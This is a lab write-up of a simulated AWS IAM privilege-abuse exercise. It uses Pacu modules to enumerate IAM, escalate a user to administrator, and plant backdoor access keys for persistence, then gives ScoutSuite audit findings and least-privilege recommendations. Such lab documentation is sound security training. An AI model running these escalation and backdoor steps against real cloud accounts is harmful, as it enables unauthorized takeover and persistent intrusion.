# Cloud Privilege Abuse Simulation

## Objective
The objective of this lab was to simulate privilege abuse in an AWS cloud environment by identifying and exploiting IAM misconfigurations. The assessment focused on privilege escalation opportunities caused by overly permissive IAM roles and policies.

---

# Tools Used
- Pacu
- AWS CLI
- ScoutSuite

---

# Lab Environment

| Machine | Purpose |
|---|---|
| Kali Linux | Attacker Machine |
| AWS Cloud Environment | Target Infrastructure |

---

# Installation and Setup

## Install AWS CLI

```bash
sudo apt update
sudo apt install awscli -y
```

Verify installation:

```bash
aws --version
```

---

## Install Pacu

```bash
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
python3 -m pip install -r requirements.txt
```

Run Pacu:

```bash
python3 cli.py
```

---

## Install ScoutSuite

```bash
pip3 install scoutsuite
```

Verify installation:

```bash
scout --help
```

---

# AWS Configuration

Configure AWS credentials:

```bash
aws configure
```

Verify access:

```bash
aws sts get-caller-identity
```

---

# Pacu Configuration

Start Pacu:

```bash
python3 cli.py
```

Create a new session and configure credentials:

```bash
set_keys
```

Verify authentication:

```bash
whoami
```

---

# IAM Enumeration

Enumerate IAM users and permissions:

```bash
aws iam list-users
aws iam list-roles
```

Using Pacu:

```bash
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
```

Findings:
- IAM users identified
- IAM roles enumerated
- Permissions analyzed

---

# Privilege Escalation

Run the privilege escalation scan:

```bash
run iam__privesc_scan
```

Pacu identified an overprivileged IAM role and successfully attached an administrator policy to the compromised IAM user.

Verification:

```bash
aws iam list-attached-user-policies --user-name cloudlab-user
```

Result:
- Administrator access successfully obtained

---

# Persistence via Backdoor Keys

Create additional access keys for persistence:

```bash
run iam__backdoor_users_keys
```

Verify created keys:

```bash
aws iam list-access-keys --user-name cloudlab-user
```

Result:
- Backdoor access keys successfully generated

---

# ScoutSuite Cloud Security Audit

Run ScoutSuite:

```bash
scout aws
```

Open the generated report:

```bash
firefox scoutsuite-report/aws-940307563991.html
```

Findings:
- IAM Findings detected
- EC2 Findings detected
- CloudTrail Findings detected
- AWS Config Findings detected

---

# Attack Log

| Attack ID | Service | Misconfiguration | Notes |
|---|---|---|---|
| AID002 | IAM | Overprivileged role | Escalated to admin |

---

# Key Findings
- IAM policies violated the principle of least privilege.
- Privilege escalation paths were discoverable using automated tools.
- Administrative privileges were obtained through policy attachment abuse.
- Persistence was achieved using additional AWS access keys.
- Cloud security auditing identified multiple AWS misconfigurations.

---

# Recommendations
1. Apply least privilege to IAM users and roles.
2. Restrict policy attachment permissions.
3. Monitor IAM changes using AWS CloudTrail.
4. Rotate and monitor AWS access keys regularly.
5. Conduct periodic cloud security audits.

---

# Summary

The simulation demonstrated privilege escalation within AWS through exploitation of an overprivileged IAM role. Using Pacu, administrative permissions were obtained and persistence was established by generating additional access keys for the compromised IAM user. The exercise highlighted the security risks associated with excessive IAM permissions and inadequate cloud identity management.

---

# Conclusion
The Cloud Privilege Abuse Simulation successfully demonstrated how IAM misconfigurations in AWS can lead to privilege escalation and persistence. The lab highlighted the importance of enforcing least privilege, continuously auditing IAM permissions, and monitoring cloud environments for suspicious activity.
